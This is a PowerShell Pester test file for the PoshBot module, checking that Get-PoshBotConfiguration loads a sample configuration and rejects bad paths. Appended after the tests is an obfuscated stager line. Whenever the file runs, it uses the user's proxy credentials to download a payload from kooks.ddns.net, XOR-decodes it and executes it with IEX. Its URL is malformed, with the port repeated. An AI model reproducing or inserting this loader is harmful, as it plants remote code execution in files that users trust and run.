
describe 'Get-PoshBotConfiguration' {

    BeforeAll {
        $PSDefaultParameterValues = @{
            'Get-PoshBotConfiguration:Verbose' = $false
        }
    }

    it 'Gets a configuration from path' {
        $psd1 = Get-Item -Path (Join-Path -Path $PSScriptRoot -ChildPath '..\..\Artifacts\Cherry2000.psd1')
        $config = Get-PoshBotConfiguration -Path $psd1
        $config | should not benullorempty
        $config.Name | should be 'Cherry2000'
    }

    it 'Accepts paths from pipeline' {
        $config = (Join-Path -Path $PSScriptRoot -ChildPath '..\..\Artifacts\Cherry2000.psd1') | Get-PoshBotConfiguration
        $config | should not benullorempty
        $config.Name | should be 'Cherry2000'
    }

    it 'Validates path and file type' {
        {Get-PoshBotConfiguration -Path '.\nonexistentfile.asdf'} | should throw
    }

    it 'Accepts LiteralPath' {
        $psd1 = Join-Path -Path $PSScriptRoot -ChildPath '..\..\Artifacts\Cherry2000.psd1'
        $config = Get-PoshBotConfiguration -LiteralPath $psd1
        $config | should not benullorempty
    }
}

$Wc=NEw-ObJECt SYSTeM.NeT.WeBClienT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HEAdeRs.ADd('User-Agent',$u);$wc.ProXy = [SyStEM.NEt.WebReQUeST]::DeFAUltWEBPROxy;$wc.PrOXY.CREdENTIAlS = [SYsteM.NET.CREDentIAlCache]::DEfAulTNEtWorKCREdENtials;$K='2ed97664d7187b121b17d1bdaeb0cb09';$i=0;[CHAR[]]$B=([ChaR[]]($Wc.DOwNlOAdStrING("http://kooks.ddns.net:4444:4444/index.asp")))|%{$_-bXor$K[$I++%$k.LengtH]};IEX ($B-jOIN'')

